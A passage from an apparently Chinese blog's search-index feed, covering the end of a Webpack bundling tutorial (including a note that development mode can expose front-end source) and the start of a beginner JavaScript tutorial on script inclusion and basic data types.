class="line">    &lt;script src=&quot;src/1.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>由于函数要先声明再调用，所以要先引用1.js，在引用2.js</p><p>如果我们先写2再写1会产生报错，而在正常的业务中可能会有很多js文件，按顺序处理过于麻烦</p><p>Webpack是一个模块打包器。在Webpack中会将前端的所有资源文件都作为模块处理。它将根据模块的依赖关系进行分析，生成对应的资源</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>1.先创建js文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731824832107-5913ac32-e8b5-45b9-a924-a340f5159633.png"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">count</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="comment">//export default是一种模块导出方式，主要用于模块化开发。它允许你将模块中的某个部分（比如函数、变量或类）标记为默认导出，便于其他模块导入和使用</span></span><br><span class="line">    <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> count <span class="keyword">from</span> <span class="string">&quot;./count.js&quot;</span>;<span class="comment">//webpack语法，不是js语法</span></span><br><span class="line"><span class="keyword">import</span> sum <span class="keyword">from</span> <span class="string">&quot;./sum.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">count</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731824823817-d2bcead6-f722-4137-8f5f-8d192f9296a1.png"></p><p>2.创建webpack配置文件webpack.config.js（名称不能修改）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入path模块，用于处理文件路径</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Webpack配置对象</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="comment">// 指定入口文件，即Webpack从这个文件开始构建依赖图</span></span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定输出配置</span></span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="comment">// 输出的文件路径，使用path.resolve确保路径的正确性</span></span><br><span class="line">        <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出的文件名</span></span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;bundle.js&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在每次构建前清理输出目录</span></span><br><span class="line">        <span class="attr">clean</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定打包模式，可以是 &#x27;development&#x27; 或 &#x27;production&#x27;</span></span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&quot;development&quot;</span>, <span class="comment">// 或者 &quot;production&quot;</span></span><br><span class="line">    <span class="comment">//mode:&quot;production&quot;,</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>entry: 指定入口文件，即Webpack从哪个文件开始构建依赖关系图。</p><p>output: 指定输出的目录和文件名，以及是否在每次构建前清理输出目录。</p><p>mode: 指定打包的模式，可以是 ‘development’ 或 ‘production’。</p><p>development 模式下会启用一些开发工具，容易造成源码泄露</p><p>production 模式下会进行代码优化，代码极简化。</p></blockquote><p>3.运行webpack打包命令：npx webpack</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731825636463-62949018-6d6e-40f8-9659-b13b60700bdc.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731825646812-5951787d-dec5-4e0d-91c6-e0c37bc1e481.png"></p><p>4.打包成功后，我们将html里的代码换成打包后的包文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731825750723-da1a8dd1-cc93-4393-afa3-d9ed1c9b1f2f.png"></p><p>5.启用调试html文件，控制台成功输出结果</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731825781330-31d1bcc2-613c-4111-a705-f3e1442e3f43.png"></p><p>源代码中可以看到打包的文件已经源文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731825840054-53cfac98-388d-4451-be42-b8d3034acdb7.png"></p><h2 id="安全问题-4"><a href="#安全问题-4" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="WebPack源码泄漏-模式选择"><a href="#WebPack源码泄漏-模式选择" class="headerlink" title="WebPack源码泄漏-模式选择"></a>WebPack源码泄漏-模式选择</h3><p>development 模式下会启用一些开发工具，容易造成源码泄露</p><p>production 模式下会进行代码优化，代码极简化。</p><p>当我们在打包的时候选择（webpack.config.js文件配置）development模式，会将源码文件泄露，前端可以直接看到文件内容</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731825988067-186cd1d2-eaa5-4c26-8a65-4e31fb9f100c.png" alt="development"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731826154070-9f8dedea-dec8-49f0-a7e4-8ad8d5f7622f.png" alt="production"></p><h3 id="JQuery"><a href="#JQuery" class="headerlink" title="JQuery"></a>JQuery</h3><p>jQuery是一个快速、简洁的JavaScript框架,是一个丰富的JavaScript代码库。设计目的是为了写更少的代码，做更多的事情。它封装JavaScript常用功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互</p><p><a href="https://blog.csdn.net/weixin_44309905/article/details/120902867">Javascript框架库漏洞验证-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础</title>
      <link href="/2025/05/27/JavaScript%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/05/27/JavaScript%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>脚本语言，可用于HTML和web，可以插入HTML页面</p><p>JS组成三部分</p><p>ECMScript：脚本程序设计语言(JavaScript的核心)</p><p>BOM：浏览器对象模型（Browser Object Model)</p><p>DOM：文档对象模型（Document Object Model)</p><p>JS功能：</p><ol><li>表单的验证：</li></ol><p>以往处理方式：表单提交一&gt;服务端判断数据一&gt;返回结果</p><p>使用JS处理方式：用户输入一&gt;提交之前检查数据合法性一&gt;获取到数据结果一&gt;最终提交内容</p><ol start="2"><li>运行在服务端：例如提供http服务、实现文件操作等</li><li>实现小游戏</li><li>实现网页特效：例如选项卡、幻灯片等</li></ol><p>JS应用到页面中的三种方法：</p><ol><li>行内应用</li></ol><p>在HTML代码中嵌入JS代码，不使用script标签</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS行内应用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;hello JS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>内部应用（内嵌）</li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS内部应用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- script标签用于执行脚本代码，默认的type值为&quot;text/javascript&quot;，指定按照js的语法执行 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// window.alert 等价于 alert</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&#x27;hello JS&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>外部应用（外联）<ol><li>先创建一个JS文件</li></ol></li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">alert(&#x27;hello JS&#x27;);</span><br></pre></td></tr></table></figure><pre><code>2. 在HTML文件中引用这个JS文件</code></pre><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS外部应用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./hello.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>var声明变量</p><p>console.log（）在控制台打印输出 （右键网页源代码-&gt;控制台）</p><p>typeof 为JS中内置语句 ，用来查看变量保存的值的数据类型</p><h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>数字类型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 变量为容器，容器中保存的数据类型是什么格式，就代表的是什么数据类型</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a = <span class="number">10</span>; <span class="comment">// 申明一个变量a，保存的值为数字类型</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// typeof 为 JS 中的内置语句，用来查看变量保存的值的数据类型</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> a);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> height = <span class="number">1.78</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> height);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> money = -<span class="number">1000</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> money);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 数字类型的数据可以进行数学运算</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// = 号代表为赋值操作，将 = 号右侧的表达式运算的结果赋值给 = 号左侧的变量</span></span></span><br><span class="line"><span class="language-javascript">    money = money + <span class="number">2000</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;计算之后的结果为：&quot;</span>,money);<span class="comment">//，也可以是+</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 进行除法运算</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(money/<span class="number">31</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 当被除数为0时，结果无意义，显示为 Infinity</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(money/<span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// NAN 表示不是一个数字 Not A Number</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &quot;a&quot; 不是数字类型的数据</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span> * <span class="number">10</span>);<span class="comment">//NAN</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a * <span class="number">10</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>字符串类型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用双引号包裹</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> name = <span class="string">&quot;爱新觉罗溥仪&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用单引号包裹</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> name2 = <span class="string">&#x27;溥仪&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> name,<span class="keyword">typeof</span> name2);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//单双引号混合使用</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>字符串类型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> info = <span class="string">&#x27;&quot;PHP&quot;是世界上最好的语言！&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(info);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> info2 = <span class="string">&quot;&#x27;HTML&#x27;是超文本标记语言！&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(info2);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//转义字符</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>字符串类型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用双引号时，里面的单引号不借助转义字符</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> name = <span class="string">&quot;My name&#x27;s Ryan&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用单引号时，需要借助转义字符来输出单引号</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> name2 = <span class="string">&#x27;My name\&#x27;s Ryan&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(name2);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 其他转义字符的使用</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> info = <span class="string">&#x27;勒索\t病毒通常使用非对称和对称加密算法组合的形式来加密文件，\n绝大部分勒索病毒均无法通过技术手段解密，一般无法溯源，危害巨大。&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(info);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717325046938-429f642a-b079-4ee8-9b66-2243bc2b9593.png" alt="常见转义字符"></p><h2 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>布尔类型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 手动指定变量的值为真，可以作为标识符使用</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> n1 = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> n1); <span class="comment">// boolean</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用运算符获取布尔值</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a = <span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> b = <span class="number">20</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 判断a是否大于b，如果a大于b，结果为真，否则结果为假</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a &gt; b); <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h2><p>undefined类型只有一种值，就是undefined.。一般是申明变量没有初始化就为undefined</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>undefined<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 只是申明了a变量</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a; <span class="comment">// =&gt; undefined</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript">    a = <span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 10</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1717325297827-de168620-a881-4143-981b-149aeebe365a.png"></p><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> 